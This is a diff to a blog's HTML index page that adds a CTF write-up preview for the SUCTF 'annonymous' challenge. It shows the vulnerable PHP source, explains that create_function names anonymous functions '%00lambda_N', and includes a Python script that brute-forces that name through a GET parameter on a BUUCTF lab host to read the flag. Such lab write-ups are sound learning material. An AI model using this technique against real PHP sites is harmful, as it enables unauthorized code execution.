@@ -153,6 +153,71 @@
     
     
     <article
+  id="post-集训第一周学习"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2022/01/19/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0/"
+    >集训第一周学习</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/01/19/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0/" class="article-date">
+  <time datetime="2022-01-18T18:25:11.000Z" itemprop="datePublished">2022-01-19</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h4 id="SUCTF-annonymous"><a href="#SUCTF-annonymous" class="headerlink" title="[SUCTF]annonymous"></a>[SUCTF]annonymous</h4><ul>
+<li>create_function</li>
+</ul>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$MY</span> = create_function(<span class="string">&quot;&quot;</span>,<span class="string">&quot;die(`cat flag.php`);&quot;</span>);</span><br><span class="line"><span class="variable">$hash</span> = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function SUCTF_<span class="subst">$hash</span>()&#123;&quot;</span></span><br><span class="line">    .<span class="string">&quot;global \$MY;&quot;</span></span><br><span class="line">    .<span class="string">&quot;\$MY();&quot;</span></span><br><span class="line">    .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&quot;func_name&quot;</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>0x01:审计</strong></p>
+<p>首先利用<code>creat_function</code>创建了一个匿名函数，而eval函数中也实现了对该函数的调用，但是eval中创建的函数名用了<code>openssl_random_pseudo_bytes</code>函数，所以很难进行爆破</p>
+<p>但是可以从匿名函数入手，因为create_function创建匿名函数时，该函数的名字会默认为<code>%00lambda_%d</code>，所以我们可以爆破后面的<code>%d</code>执行对应的匿名函数</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://3f157adf-697c-4764-b2cc-994d24033869.node4.buuoj.cn:81/?func_name=%00lambda_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;$flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;go! &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br></pre></td></tr></table></figure>
+
+<p>就可以得到flag了</p> 
+      <a class="article-more-link" href="/2022/01/19/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0/"
+        >阅读更多...</a
+      >
+       
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9B%86%E8%AE%AD%E9%9B%86%E8%AE%AD%E9%9B%86%E8%AE%AD/" rel="tag">集训集训集训</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
   id="post-java序列化学习"
   class="article article-type-post"
   itemscope
